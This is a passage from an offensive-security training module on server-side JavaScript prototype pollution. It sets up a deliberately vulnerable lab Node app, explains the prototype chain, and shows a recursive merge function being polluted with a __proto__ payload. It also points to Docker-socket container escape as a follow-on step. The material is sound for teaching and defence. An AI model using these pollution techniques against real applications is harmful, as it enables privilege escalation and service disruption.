##### Guacamole Lite Prototype Pollution
Prototype pollution refers to a JavaScript vulnerability in which an attacker can inject properties in every object created by an application. While prototype pollution is not a new JavaScript concept, it has only recently become an attack vector. Server-side attacks using prototype pollution were popularized by Olivier Arteau in a talk given at NorthSec in October 2018.1 In this module, we will be concentrating on these server-side attacks. While client-side prototype pollution attacks exist, they are slightly different.

Prototype pollution vulnerabilities often appear in libraries that merge or extend objects. For a web application to be vulnerable to prototype pollution in an exploitable way, it must use a vulnerable merge/extend function and provide a path to code execution or authentication bypass using the injected properties.

Since this exploitation path is difficult, most online discussion surrounding this topic is theoretical.

In order to practically demonstrate the vulnerability, we have created a basic application that uses guacamole-lite2 (a Node package for connecting to RDP clients via a browser) and various templating engines. Guacamole-lite uses a library that is vulnerable to prototype pollution when processing untrusted user input. We will leverage prototype pollution against two different templating engines to achieve RCE on the target.

We'll take a whitebox approach to teach the concepts, but we will also cover how we can discover a vulnerability like this using blackbox concepts.

1
(Arteau, 2018), https://www.youtube.com/watch?v=LUsiFV3dsK8 ↩︎

2
(Pronin, 2020), https://www.npmjs.com/package/guacamole-lite ↩︎

10.1. Getting Started
To demonstrate this vulnerability, we created a target application, "Chips", which provides access to RDP clients via a web interface.

Before we begin exploiting, let's first explore the target application, find the inputs, switch templating engines, and connect to it via a remote debugger.

In order to access the Chips server, we have created a hosts file entry named "chips" on our Kali Linux VM. Make this change with the corresponding IP address on your Kali machine to follow along. Be sure to revert the Chips virtual machine from the Labs page before starting your work. The Chips box credentials are listed below.

URL	Username	Password
http://chips/		
ssh://chips	student	studentlab
Table 1 - Setup information

Let's start by visiting the Chips homepage and exploring the application. We'll do this using Burp Suite and its browser in order to capture requests.

When we connect, we are presented with a page that lists some container information, allows us to change the connection settings, and allows us to connect to the RDP client. The About section states "Your dev environment is one step away. Click connect to start the session". This type of application might be used for demonstrating development environments.

Figure 1: Chips Homepage
Figure 1: Chips Homepage
When we click Connect, the application loads a new page with the desktop of the RDP client.

Figure 2: Chips RDP Connection
Figure 2: Chips RDP Connection
By reviewing the requests in the Burp HTTP history, we find three interesting requests. First we discover a POST to /tokens containing a JSON payload with the connection information.

Figure 3: Chips /token Request
Figure 3: Chips /token Request
Next, we find a request to /rdp with a token query parameter containing a base64 payload. When decoded, the payload displays a JSON object containing "iv" and "value" parameters. Based on the existence of an "iv" parameter, we can assume that this payload is encrypted.1 This will be important later on.

Figure 4: Chips /rdp Request
Figure 4: Chips /rdp Request
Finally, we also find a GET request to /guaclite with the same token value discovered earlier. This request responds with a "101 Switching Protocols" response, which is used to start a WebSocket connection.

Figure 5: Chips /guaclite Request
Figure 5: Chips /guaclite Request
Considering that we have not found any HTTP requests that stream the image, sound, and mouse movements to the RDP client, we can assume that this is made through the WebSocket connection. We can confirm this by clicking on WebSockets history in Burp Suite and reviewing the captured information.

Figure 6: Chips Websocket Traffic
Figure 6: Chips Websocket Traffic
Navigating back to the homepage in our browser, we also find an "Advanced Connection Settings" button, which presents the settings that were contained in the "/token" request.

Figure 7: Chips Advanced Connection Settings
Figure 7: Chips Advanced Connection Settings
We'll target the three endpoints we discovered, beginning with a source code review of each one.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Initialization_vector ↩︎

10.1.1. Understanding the Code
Let's begin by downloading the code to our Kali machine using rsync.

kali@kali:~$ rsync -az --compress-level=1 student@chips:/home/student/chips/ chips/
student@chips's password: 
Listing 1 - Downloading the Chips Source Code

Next, we'll open the source code in Visual Studio Code.

kali@kali:~$ code -a chips/
Listing 2 - Opening Chips Source in VS Code

The downloaded code has the following folder structure:

chips/
├── app.js
├── bin
│   └── www
├── docker-compose.yml
├── Dockerfile
├── .dockerignore
├── frontend
│   ├── index.js
│   ├── rdp.js
│   ├── root.js
│   └── style
├── node_modules
│   ├── abbrev
│   ├── accepts
    ...
├── package.json
├── package-lock.json
├── public
│   ├── images
│   └── js
├── routes
│   ├── files.js
│   ├── index.js
│   ├── rdp.js
│   └── token.js
├── settings
│   ├── clientOptions.json
│   ├── connectionOptions.json
│   └── guacdOptions.json
├── shared
│   └── README.md
├── version.txt
├── views
│   ├── ejs
│   ├── hbs
│   └── pug
├── .vscode
│   └── launch.json
└── webpack.config.js
Listing 3 - Chips Folder Structure

The existence of bin/www, package.json, and routes/ indicate that this is a NodeJS web application. In particular, package.json identifies a NodeJS project and manages its dependencies.1

The existence of the docker-compose.yml and Dockerfile files indicate that this application is started using Docker containers.

Let's review package.json to get more information about the application.

01  {
02    "name": "chips",
03    "version": "1.0.0",
04    "private": true,
05    "scripts": {
06      "start-dev": "node --inspect=0.0.0.0 ./bin/www",
07      "watch": "webpack watch --mode development",
08      "start": "webpack build --mode production && node ./bin/www",
09      "build": "webpack build --mode development"
10    },
11    "devDependencies": {
12      "@babel/core": "^7.13.1",
...
24      "webpack": "^5.24.2",
...
33    },
34    "dependencies": {
35      "cookie-parser": "~1.4.4",
36      "debug": "~2.6.9",
37      "dockerode": "^3.2.1",
38      "dotenv": "^8.2.0",
39      "ejs": "^3.1.6",
40      "express": "~4.16.1",
41      "guacamole-lite": "0.6.3",
42      "hbs": "^4.1.1",
43      "http-errors": "~1.6.3",
44      "morgan": "~1.9.1",
45      "pug": "^3.0.2"
46    }
47  }
Listing 4 - Chips package.json

We can learn three things from package.json. First, the application is started using the ./bin/www file (line 6). Second, we find that "Webpack" is installed (lines 7-10 and 24). Webpack is most often used to bundle external client side packages (like jQuery, Bootstrap, etc) and custom JavaScript code into a single file to be served by a web server. This means that the frontend directory will most likely contain all the frontend assets, including the code that started the WebSocket connection. Finally, the application is built using the "Express" web application framework (line 40). This means that the routes directory will probably contain the definitions to the endpoints we discovered earlier.

Let's analyze ./bin/www to understand how the application is started.

01  #!/usr/bin/env node
...
07  var app = require('../app');
08  var debug = require('debug')('app:server');
09  var http = require('http');
10  const GuacamoleLite = require('guacamole-lite');
11  const clientOptions = require("../settings/clientOptions.json")
12  const guacdOptions = require("../settings/guacdOptions.json");
13
...
25  var server = http.createServer(app);
26
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions);
28
29  /**
30   * Listen on provided port, on all network interfaces.
31   */
32
33  server.listen(port);
34  server.on('error', onError);
35  server.on('listening', onListening);
...

Listing 5 - ./bin/www Source

From this file we learn that app.js is loaded and used to create the server. Note that ".js" is omitted from require statements. On lines 33-35, the HTTP server is started. However, before it is started, the server is also passed into the GuacamoleLite constructor (line 27). This could allow the guacamole-lite package to create endpoints not defined in Express.

Next, let's review the app.js file.

01  var createError = require('http-errors');
02  var express = require('express');
03  var path = require('path');
...
11
13  var app = express();
14
15  // view engine setup
16  t_engine = process.env.TEMPLATING_ENGINE;
17  if (t_engine !== "hbs" && t_engine !== "ejs" && t_engine !== "pug" )
18  {
19      t_engine = "hbs";
20  }
21
22 app.set('views', path.join(__dirname, 'views/' + t_engine));
23 app.set('view engine', t_engine);
...
30
31  app.use('/', indexRouter);
32  app.use('/token', tokenRouter);
33  app.use('/rdp', rdpRouter);
34 app.use('/files', filesRouter);
...
Listing 6 - Chips app.js File

The app.js file sets up many parts of the application. Most importantly, we discover that two of the routes are defined on lines 32 and 33. We also find that lines 16-20 allow us to set the templating engine of the application to hbs(Handlebars), EJS, or Pug with the default being hbs. This is set via the TEMPLATING_ENGINE environment variable. This is an unusual feature for a web application. However, we added this into the application to easily allow us to switch between the various templating engines. We'll use this to demonstrate multiple ways of leveraging prototype pollution against an application.

hbs is Handlebars implemented for Express. However, it uses the original Handlebars library. From this point forward we will use "Handlebars" to refer to this templating engine.

To show how to change the templating engine, we'll review docker-compose.yml to better understand the layout of the application.

1	 version: '3'
2	 services:
3	   chips:
4	     build: .
5	     command: npm run start-dev
6	     restart: always
7	     environment:
8	       - TEMPLATING_ENGINE
9	     volumes:
10	      - .:/usr/src/app
11	      - /var/run/docker.sock:/var/run/docker.sock
12	    ports:
13	      - "80:3000"
14	      - "9229:9229"
15	      - "9228:9228"
16	  guacd:
17	    restart: always
18	    image: linuxserver/guacd
19	    container_name: guacd
20	
21	  rdesktop:
22	    restart: always
23	    image: linuxserver/rdesktop
24	    container_name: rdesktop
25      volumes:
26        - ./shared:/shared
27	    environment:
28	      - PUID=1000
29	      - PGID=1000
30	      - TZ=Europe/London
Listing 7 - docker-compose.yml

Line 5 reveals that we can start the application with the start-dev script (from package.json). This script starts the application on port 9229 with debugging enabled. In production, this should never be set, but it is enabled here for easier debugging when we are attempting to exploit the target.

This file also references the TEMPLATING_ENGINE environment variable on line 8. We can set this variable from the command line before running the docker-compose command.

Finally, we find that web application container (chips) is started with /var/run/docker.sock mounted (line 11). This gives the chips container full access to the Docker socket. With access to the Docker socket, we may be able to escape the container and obtain RCE on the host if we can get RCE on the web app container.2 We can keep this in mind, but first we need to focus on understanding the application.

Let's try changing templating engines. First, we'll stop the existing instance of the application with docker-compose down.

kali@kali:~$ ssh student@chips
...
student@oswe:~$ cd chips/

student@oswe:~/chips$ docker-compose down
Stopping chips_chips_1   ... done
Stopping rdesktop        ... done
Stopping guacd           ... done
Removing chips_chips_1                ... done
Removing chips_chips_run_b082290a7ff7 ... done
Removing rdesktop                     ... done
Removing guacd                        ... done
Removing network chips_default
Listing 8 - Stopping Application

Once the application is stopped, we can start it and set TEMPLATING_ENGINE=ejs before the docker-compose up command. This will instruct app.js to use the EJS templating engine and the views found in the views/ejs folder. Starting the application should only take a couple of seconds. Once the logs start to slow down, the application should be started.

student@oswe:~/chips$ TEMPLATING_ENGINE=ejs docker-compose up
Starting rdesktop        ... done
Starting chips_chips_1   ... done
Starting guacd           ... done
Attaching to guacd, chips_chips_1, rdesktop
guacd       | [s6-init] making user provided files available at /var/run/s6/etc...exited 0.
...
guacd       | [services.d] done.
rdesktop    | [s6-init] making user provided files available at /var/run/s6/etc...exited 0.
....
rdesktop    | [services.d] done.
chips_1     | 
chips_1     | > app@0.0.0 start-dev /usr/src/app
...
chips_1     | Starting guacamole-lite websocket server
Listing 9 - Starting the Chips Server with EJS

The application was built with comments in the views for all the templating engines. We'll use these comments to differentiate between the templating engines.

kali@kali:~$ curl http://chips -s | grep "<\!--"
        <!-- Using EJS as Templating Engine -->
Listing 10 - Validating Templating Engine

We are now running Chips using the EJS templating engine. We'll use this setup for now and change engines later on in the module.

Next, we'll ensure that remote debugging is working as expected.

Exercises
Reconfigure your Chips instance to use EJS instead of the default.
Review the three JavaScript files in routes to understand what each one does.
1
(Lokesh, 2020), https://dev.to/devlcodes/file-structure-of-a-node-project-3opk ↩︎

2
(Dejandayoff, 2019), https://dejandayoff.com/the-danger-of-exposing-docker.sock/ ↩︎

10.1.2. Configuring Remote Debugging
A .vscode/launch.json file is provided within the Chips source code, which we can use to quickly set up debugging. We will need to update both address fields to point to the remote server.

{

	"version": "0.2.0",
	"configurations": [
		{
			"type": "node",
			"request": "attach",
			"name": "Attach to remote",
			"address": "chips",
			"port": 9229,
			"localRoot": "${workspaceFolder}",
			"remoteRoot": "/usr/src/app"
		},
		{
			"type": "node",
			"request": "attach",
			"name": "Attach to remote (cli)",
			"address": "chips",
			"port": 9228,
			"localRoot": "${workspaceFolder}",
			"remoteRoot": "/usr/src/app"
		}
	]
}
Listing 11 - launch.json

There are two remote debugging profiles configured. The first is on port 9229. The application is already started using the start-dev script from package.json, which will start Node on port 9229. To validate that this is working, we need to navigate to the Run and Debug tab in Visual Studio Code and start the profile.

Figure 8: Starting Remote Debugging
Figure 8: Starting Remote Debugging
When the remote debugging is connected, the Debug Console will show "Starting guacamole-lite websocket server" and the bottom bar will turn orange.

Figure 9: Connected to Remote Debugging
Figure 9: Connected to Remote Debugging
We can disconnect by clicking Disconnect near the top of VS Code.

Figure 10: Disconnecting Remote Debugging
Figure 10: Disconnecting Remote Debugging
Next, we will attempt to connect via the CLI. Later in the module, we will use the Node CLI with debugging to understand how prototype pollution and templating engines work.

First, we must start Node.js (with debugging enabled) from the web application container in a new terminal window. To do this, we will open a new SSH session to the chips server and use docker-compose with the exec command.

While we can cd into the ~/chips directory and have docker-compose automatically pick up the docker-compose.yml file, we can also pass this file in with the -f flag.

Next, we'll tell docker-compose we want to execute a command on the chips container (as defined in docker-compose.yml). The command we want to execute is node --inspect=0.0.0.0:9228 to start an interactive shell but open port 9228 for remote debugging.

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> 
Listing 12 - Starting Interactive Shell

Next, we can select the Attach to remote (cli) setting in Visual Studio Code and start debugging.

Figure 11: Connecting Debugger to Remote CLI
Figure 11: Connecting Debugger to Remote CLI
The bottom bar in the IDE should again turn orange and debugging should begin. We should also get a "Debugger attached" message in the interactive node shell.

The benefit of debugging via the cli is that we can now set breakpoints in individual libraries, load them in the interactive cli, and run individual methods without making changes to the web application and reloading every time.

With remote debugging set up, we can begin exploring how JavaScript prototype works and how to exploit a prototype pollution vulnerability.

Exercise
Configure remote debugging via CLI and the web application.


##### Introduction to JavaScript Prototype
Before we discuss the JavaScript prototype,1 we must first understand that nearly everything in JavaScript is an object. This includes arrays, Browser APIs, and functions.2 The only exceptions are null, undefined, strings, numbers, booleans, and symbols.3

Unlike other object-oriented programming languages, JavaScript is not considered a class-based language.4 As of the ES2015 standard, JavaScript does support class declarations. However, in JavaScript the class keyword is a helper function that makes existing JavaScript implementations more familiar to users of class-based programming.5

We'll demonstrate this by creating a class and checking the type. We can use the same interactive Node shell we created in the previous section or start a new one.

student@chips:~$ docker-compose -f ~/chips/docker-compose.yml exec chips node --inspect=0.0.0.0:9228
Debugger listening on ws://0.0.0.0:9228/b38f428b-edfa-42cf-be6a-590bc333a3ad
For help, see: https://nodejs.org/en/docs/inspector
Welcome to Node.js v14.16.0.
Type ".help" for more information.
> class Student {
...     constructor() {
.....     this.id = 1;
.....     this.enrolled = true
.....   }
...     isActive() {
...             console.log("Checking if active")
...             return this.enrolled
...     }
... }
undefined

> s = new Student
Student { id: 1, enrolled: true }

> s.isActive()
Checking if active
true

> typeof s
'object'

> typeof Student
'function'
Listing 13 - A class type is actually a "function"

In Listing 13, we find that the Student class is actually a function. But what does this mean? Before ES2015, classes would be created using constructor functions.6

> function Student() {
...     this.id = 2;
...     this.enrolled = false
... }
undefined
> 

> Student.prototype.isActive = function() {
...     console.log("Checking if active")
...     return this.enrolled;
... };
[Function (anonymous)]

> s = new Student
Student { id: 2, enrolled: false }

> s.isActive()
Checking if active
false

> typeof s
'object'

> typeof Student
'function'
Listing 14 - Pre ES2015 "Class"

The class keyword in JavaScript is just syntactic sugar for the constructor function.

Both class and the constructor function use the new keyword to create an object from the class. Let's investigate how this keyword works.

According to the documentation,7 JavaScript's new keyword will first create an empty object. Within that object, it will set the __proto__ value to the constructor function's prototype (where we set isActive). With __proto__ set, the new keyword ensures that this refers to the context of the newly created object. Listing 14 shows that this.id and this.enrolled of the new object are set to the respective values. Finally, this is returned (unless the function returns its own object).

The use of prototype and __proto__ can be confusing for those familiar with other object-oriented programming languages like C# and Java.

Many object-oriented programming languages, such as Java, use a class-based inheritance model in which a blueprint (class) is used to instantiate individual objects, which represent an item in the real world. The car we own (object in the real world) would inherit from a Car class (the blueprint), which contains methods on how to move, brake, turn, etc.

In this class-based inheritance model, we can run the move() function in the Car object, which was inherited from the Car class. However, we cannot run move() directly in the Car class since it's only a blueprint for other classes. We also cannot inherit from multiple classes, like we would if we wanted to inherit from a vehicle class and a robot class to create a half-car, half-robot Transformer.8

However, JavaScript uses prototype inheritance, which means that an object inherits properties from another object. If we refer back to Listing 13 and Listing 14, Student is a function (don't forget that functions are also objects). When we create an s object, the new keyword inherits from the Student object.

JavaScript benefits from prototype inheritance in many ways. For starters, one object may inherit the properties of multiple objects. In addition, the properties inherited from higher-level objects can be modified during runtime.9 This could, for example, allow us to create our desired Transformer with dynamically changing attack() functions that are modified for each Transformer's unique power.

The ability to change the inherited properties of a set of objects is a powerful feature for developers. However, this power can also be used to exploit an application if improperly handled.

This inheritance creates a prototype chain, which is best summarized by the MDN Web Docs:10

When it comes to inheritance, JavaScript only has one construct: objects. Each object has a private property which holds a link to another object called its prototype. That prototype object has a prototype of its own, and so on until an object is reached with null as its prototype. By definition, null has no prototype, and acts as the final link in this prototype chain.

It's important to note that __proto__ is part of the prototype chain, but prototype is not.11 Remember, the new keyword sets __proto__ to the constructor function prototype.

Earlier, we set the isActive prototype of Student to a function that logs a message to the console and returns the status of the Student. It should not come as a surprise that we can call the isActive function directly from the "class".

> Student.prototype.isActive()
Checking if active
undefined
Listing 15 - Running isActive From "class"

As expected, the function executed, logged to the console, and returned "undefined" since enrolled is not set in the prototype instance. However, if we try to access isActive within the Student function constructor instead of the prototype, the function is not found.

> Student.isActive
undefined
Listing 16 - isActive is not Defined in the Function Constructor

This is because prototype is not part of the prototype chain but __proto__ is. When we run isActive on the s object, we are actually running the function within s.__proto__.isActive() (with this context properly bound to the values in the object). We can validate this by creating a new isActive function directly in the s object instead of running the one in __proto__. We can then delete the new isActive function and observe that the prototype chain resolves the old isActive function from __proto__.

> s.isActive()
Checking if active
false

> s.isActive = function(){
... console.log("New isActive");
... return true;
... }
[Function (anonymous)]

> s.isActive()
New isActive
true

> s.__proto__.isActive()
Checking if active
undefined

> delete s.isActive
true

> s.isActive()
Checking if active
false
Listing 17 - Demo of the prototype Chain in Action

When we set isActive on the s object directly, __proto__.isActive was not executed.

One interesting component of this chain is that when Student.prototype.isActive is modified, so is s.__proto__.isActive.

> Student.prototype.isActive = function () {
... console.log("Updated isActive in Student");
... return this.enrolled;
... }
[Function (anonymous)]

> s.isActive()
Updated isActive in Student
false
Listing 18 - Prototype link to Student

When we called the s.isActive() function, the updated function was executed because the isActive function is a link from the __proto__ object to the prototype of Student.

If we poke around the s object further, we find there are other functions that are available that we did not set, like toString.

> s.toString()
'[object Object]'
Listing 19 - toString of Object

The toString function returns a string representation of the object. This toString function is a built-in function in the prototype of the Object class.12

Note that Object (capital "O") refers to the Object data-type class. s is an object that inherits properties from the Student class. The Student class inherits properties from the Object class (since almost everything in JavaScript is an Object).

> o = new Object()
{}

> o.toString()
'[object Object]'

> {}.toString()
'[object Object]'
Listing 20 - toString in Object

We can add a new toString to be something a bit more usable in our object by setting toString in the prototype of the Student constructor function.

> s.toString()
'[object Object]'

> Student.prototype.toString = function () {
... console.log("in Student prototype");
... return this.id.toString();
... }
[Function (anonymous)]

> s.toString()
in Student prototype
'2'
Listing 21 - Updated toString

The toString function now returns the id of the Student as a string.

As we demonstrated earlier, we can also add toString directly to the s object.

> s.toString = function () {
... console.log("in s object");
... return this.id.toString();
... }
[Function (anonymous)]

> s.toString()
in s object
'2'
Listing 22 - toString in s object

At this point, this object has three toString functions in its prototype chain. The first is the Object class prototype, the second is in the Student prototype, and the last is in the s object directly. The prototype chain will select the one that comes up first in the search, which in this case is the function in the s object. If we create a new object from the Student constructor, which toString method will be the default when called?

> s2 = new Student()
Student { id: 2, enrolled: false }

> s2.toString()
in Student prototype
'2'
Listing 23 - toString in New Object

The new Student object uses the toString method within the Student prototype.

What would happen if we changed the toString function in the Object class prototype?

> Object.prototype.toString = function () {
... console.log("in Object prototype")
... return this.id.toString();
... }
[Function (anonymous)]

> delete s.toString
true

> delete Student.prototype.toString
true

> s.toString()
in Object prototype
'2'
Listing 24 - toString in Object Class

In Listing 24, we set the toString to log a message and return the id. We also deleted the other toString functions in the chain to ensure we execute the one in Object. When we run s.toString(), we find that we are indeed running the toString function in the Object prototype.

Remember earlier when we found that even new Objects get the updated prototype when changed in the constructor, and that almost everything in JavaScript is made with Objects? Well, let's check out the toString function of a blank object now.

> {}.toString()
in Object prototype
Uncaught TypeError: Cannot read property 'toString' of undefined
    at Object.toString (repl:3:16)
Listing 25 - toString of Blank object after prototype update

Since the blank object does not have an id, we receive an error. However, because of this error and the "in Object prototype" message, we know that we are executing the custom function we created in the Object prototype.

At this point, we have polluted the prototype of nearly every object in JavaScript and changed the toString function every time it is executed.

These changes to the toString function only affect the current interpreter process. However, they will continue to affect the process until it is restarted. In order to wipe this change, we must exit the Node interactive CLI and start a new interactive session.

Similarly, Node web applications are affected in the same way. Once the prototype is polluted, it will stay that way until the application is rebooted or crashes, which causes a reboot.

Next, let's discuss how we can use prototype pollution to our advantage.

Exercise
Explain the following:
> Object.toString()
'function Object() { [native code] }'

> (new Object).toString()
'[object Object]'

> (new Function).toString()
'function anonymous(\n) {\n\n}'

> {}.__proto__.toString = "breaking toString"
'breaking toString'

> (new Object).toString()
Uncaught TypeError: (intermediate value).toString is not a function

> (new Function).toString()
'function anonymous(\n) {\n\n}'
Listing 26 - Function toString is not broken

As Listing 26 shows, when the toString is overwritten in the Object prototype, the toString function is not overwritten. Why is that?

1
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes ↩︎

2
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects ↩︎

3
(Salman, 2019), https://blog.bitsrc.io/the-chronicles-of-javascript-objects-2d6b9205cd66 ↩︎

4
(Elliott, 2016), https://medium.com/javascript-scene/master-the-javascript-interview-what-s-the-difference-between-class-prototypal-inheritance-e4cd0a7562e9 ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/ECMAScript#6th_Edition_–_ECMAScript_2015 ↩︎

6
(Schwartz, 2017), https://medium.com/@ericschwartz7/oo-javascript-es6-class-vs-object-prototype-5debfbf8296e ↩︎

7
(Mozilla, year), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new#description ↩︎

8
(Hasbro, 2021), https://transformers.hasbro.com/en-us ↩︎

9
(Shah, 2013), http://aaditmshah.github.io/why-prototypal-inheritance-matters/#constructors_vs_prototypes ↩︎

10
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain ↩︎

11
(Kahn, 2021), https://stackoverflow.com/a/9959753 ↩︎

12
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString ↩︎


##### Prototype Pollution
Prototype pollution was not always considered a security issue. In fact, it was used as a feature to extend JavaScript in third-party libraries.1 For example, a library could add a "first" function to all arrays(),2 "toISOString" to all Dates, 3 and "toHTML" to all objects.4

However, this caused issues with future-proofing code since any native implementations that came out later would be replaced by the less efficient third-party API. Even so, this by itself is not a security issue.5

However, if an application accepts user input and allows us to inject into the prototype of Object, this creates a security issue.

While there are many situations that might cause this, it often occurs in extend or merge type functions. These functions merge objects together to create a new merged or extended object.

For example, consider the following code:

const { isObject } = require("util");   

function merge(a,b) {
	for (var key in b){
		if (isObject(a[key]) && isObject(b[key])) {
			merge(a[key], b[key])
		}else {
			a[key] = b[key];
		}
	}
	return a
}
Listing 27 - Merge Function

The merge function above accepts two objects. It iterates through each key in the second object. If the value of the key in the first and second object are also objects, the function will recursively call itself and pass in the two objects. If these are not objects, the value of the key in the first object will be set to the value of the key in the second object using computed property names.6

Using this method, we can merge two objects:

> const { isObject } = require("util");
undefined
> function merge(a,b) {
... 	for (var key in b){
..... 		if (isObject(a[key]) && isObject(b[key])) {
....... 			merge(a[key], b[key])
....... 		}else {
....... 			a[key] = b[key];
....... 		}
..... 	}
... 	return a
... }
undefined

> x = {"hello": "world"}
{ hello: 'world' }

> y = {"foo" :{"bar": "foobar"}}
{ foo: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world', foo: { bar: 'foobar' } }
Listing 28 - Merging 2 objects

This gets interesting when we set the "__proto__" key in the second object to another object.

> x = {"hello": "world"}
{ hello: 'world' }

> y = {["__proto__"] :{"bar": "foobar"}}
{ __proto__: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world' }
Listing 29 - Merge With proto

The square brackets around "__proto__" will ensure that __proto__ will be enumerable. Setting the value this way sets isProtoSetter to false, making the object enumerable by the for loop in the merge function.7

When the merge function runs, it will iterate through all the keys in the y object. The only key in this object is "__proto__".

Since x["__proto__"] will always be an object (remember, it's a link to the prototype of the parent object) and y["__proto__"] will be an object (since we set it to one), the if statement will be true. This means that the merge function will be called using x["__proto__"] and y["__proto__"] as arguments.

When the merge function runs again, the for loop will enumerate the keys of y["__proto__"]. The only attribute of y["__proto__"] is "bar". Since this attribute does not exist in x["__proto__"], the if statement will be false and the else branch will be executed. The else branch will set the value of x["__proto__"]["bar"] to the value of y["__proto__"]["bar"] (or "foobar").

However, since x["__proto__"] is pointing to the Object class prototype, then all objects will be polluted due to the merge. We can witness this by checking the value of bar in newly created objects.

> {}.bar
'foobar'
Listing 30 - "bar" Attribute of New Object

Clearly, this can become dangerous if, for example, we begin adding attributes like "isAdmin" to all objects. If the application is coded in a particular way, all users suddenly become administrators.

Even if __proto__ of one object is the prototype of a user-defined class (like in our Student example earlier), we can chain multiple "__proto__" keys until we reach the Object class prototype:

> delete {}.__proto__.bar
true

> function Student() {
... this.id = 2;
... this.enrolled = false
... }
undefined

> s = new Student
Student { id: 2, enrolled: false }

> s2 = new Student
Student { id: 2, enrolled: false }

> x = {"foo": "bar"}
{ foo: 'bar' }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> x = {["__proto__"]: { "foo": "bar" }}
{ __proto__: { foo: 'bar' } }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> {}.foo
undefined

> s.foo
'bar'

> s2.foo
'bar'
Listing 31 - Setting Object Prototype in User Defined Class Unsuccessfully

In this case, when we set the "__proto__" object only one level deep, we are actually only interacting with the prototype of the Student class. As a result, both s and s2 have the value of foo set to "bar".

> x = {["__proto__"]: { ["__proto__"]: {"foo": "bar" }}}
{ __proto__: { __proto__: { foo: 'bar' } } }

> merge(s,x)
Student { id: 2, enrolled: false, foo: 'bar' }

> {}.foo
'bar'
Listing 32 - Setting Object Prototype in User Defined Class Successfully

However, when we set the "__proto__" object multiple levels deep, we find that we begin interacting higher up in the prototype chain. At that point, all objects start to have the value of foo set to "bar".

It's important to note that for a merge function to be vulnerable (and functional), it must recursively call itself when the value of the keys are both objects. For example, the following code is not vulnerable and does not properly merge two objects:

function badMerge (a,b) {
  for (var key in b) {
    a[key] = b[key]; 
  }
  return a
}
Listing 33 - Non-vulnerable Merge

A function like this does not work as a true merge function since it does not recursively merge objects.

> delete {}.__proto__.foo
true

> function badMerge (a,b) {
...   for (var key in b) {
.....     a[key] = b[key]; 
.....   }
...   return a
... }
undefined

> x = {"foo": {"bar": "foobar" }}
{ foo: { bar: 'foobar' } }

> y = {"foo": {"hello": "world" }}
{ foo: { hello: 'world' } }

> merge(x,y)
{ foo: { bar: 'foobar', hello: 'world' } }

> x = {"foo": {"bar": "foobar" }}
{ foo: { bar: 'foobar' } }

> y = {"foo": {"hello": "world" }}
{ foo: { hello: 'world' } }

> badMerge(x,y)
{ foo: { hello: 'world' } }
Listing 34 - Using BadMerge

Since badMerge does not recursively call itself on objects to merge individual objects, the individual keys in an object are not merged. Because of this, a function like badMerge would not be vulnerable to prototype pollution.

There are a few more minor details about prototype pollution that we should consider before moving on. For example, variables polluted into the prototype are enumerable in for...in statements.8

> x = {"hello": "world"}
{ hello: 'world' }

> y = {["__proto__"] :{"bar": "foobar"}}
{ __proto__: { bar: 'foobar' } }

> merge(x,y)
{ hello: 'world' }

> for (var key in {}) console.log(key)
bar
Listing 35 - Using for Loop to Enumerate Polluted Object

The polluted variables are also enumerable in arrays.

> for (var i in [1,2]) console.log(i)
0
1
bar
Listing 36 - Using for Loop to Enumerate Polluted Array

This occurs because for...in statements will iterate over all the enumerable properties. However, the variable in the prototype does not increase the array length. Because of this, if a loop uses the array length, the polluted variables are not enumerated.

> for (i = 0; i< [1,2].length; i++) console.log([1,2][i])
1
2
undefined
Listing 37 - Using forEach to Enumerate Polluted Array

This is also true of the forEach loop since ECMAscript specifies that forEach use the length of the array.9

> [1,2].forEach(i => console.log(i))
1
2
Listing 38 - Using forEach to Enumerate Polluted Array

Now that we know how to use JavaScript's prototype and how to pollute with it, let's investigate how to discover it using blackbox and whitebox techniques.

1
(Prototype Core Team., 2015), http://prototypejs.org/learn/extensions ↩︎

2
(Prototype Core Team., 2015), https://github.com/prototypejs/prototype/blob/5fddd3e/src/prototype/lang/array.js#L222 ↩︎

3
(Prototype Core Team., 2015), https://github.com/prototypejs/prototype/blob/5fddd3e/src/prototype/lang/date.js#L24 ↩︎

4
(Prototype Core Team., 2015), https://github.com/prototypejs/prototype/blob/5fddd3ef8c93d8419fb45b7f8c6fddeb9f591150/src/prototype/lang/object.js#L301 ↩︎

5
(Croll, 2011), https://javascriptweblog.wordpress.com/2011/12/05/extending-javascript-natives/ ↩︎

6
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Object_initializer#computed_property_names ↩︎

7
(CertainPerformance, 2021), https://stackoverflow.com/a/66556134 ↩︎

8
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/for...in ↩︎

9
(Ecma International, 2021), https://tc39.es/ecma262/#sec-array.prototype.foreach ↩︎

##### Blackbox Discovery
As with many blackbox exploitation techniques, we'll be operating blindly when searching for prototype pollution. False negatives will be common, but we can leverage a simple methodology.

However, we must warn that these techniques are abrasive and might lead to denial of service of the target application. Unlike reflected XSS, prototype pollution will continue affecting the target application until it is restarted.

Up to this point, we have been using JavaScript objects to demonstrate the power of prototype pollution. However, we usually cannot pass direct JavaScript objects within HTTP requests. Instead, the requests would need to contain some kind of serialized data, such as JSON.

